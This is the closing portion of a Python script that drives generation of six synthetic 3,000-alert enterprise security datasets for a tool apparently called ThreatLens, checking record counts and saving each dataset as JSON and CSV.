    print(f"[{filename_stem}] Saved: JSON ({os.path.getsize(json_path):,} B), CSV ({os.path.getsize(csv_path):,} B) - Count: {len(records)} JSON, {csv_rows} CSV rows.")


def main():
    print("=" * 70)
    print("ThreatLens: Generating 6 Diverse 3,000-Alert Enterprise Datasets")
    print("=" * 70)

    datasets = [
        ("1_multi_attack_enterprise_storm_3000", generate_dataset_1),
        ("2_dual_moderate_campaign_3000", generate_dataset_2),
        ("3_stealth_insider_low_3000", generate_dataset_3),
        ("4_clean_enterprise_zero_attacks_3000", generate_dataset_4),
        ("5_perimeter_scanner_ransomware_3000", generate_dataset_5),
        ("6_policy_violations_low_risk_3000", generate_dataset_6),
    ]

    for stem, generator_fn in datasets:
        print(f"Generating {stem}...")
        records = generator_fn()
        assert len(records) == 3000, f"Expected 3000 records, got {len(records)}"
        save_dataset(stem, records)

    # Also keep backward compatibility copy of dataset 1 as enterprise_3000_alerts_challenge
    d1_records = generate_dataset_1()
    save_dataset("enterprise_3000_alerts_challenge", d1_records)

    print("\nAll 6 enterprise 3,000-alert datasets successfully generated and verified!")


if __name__ == "__main__":
    main()
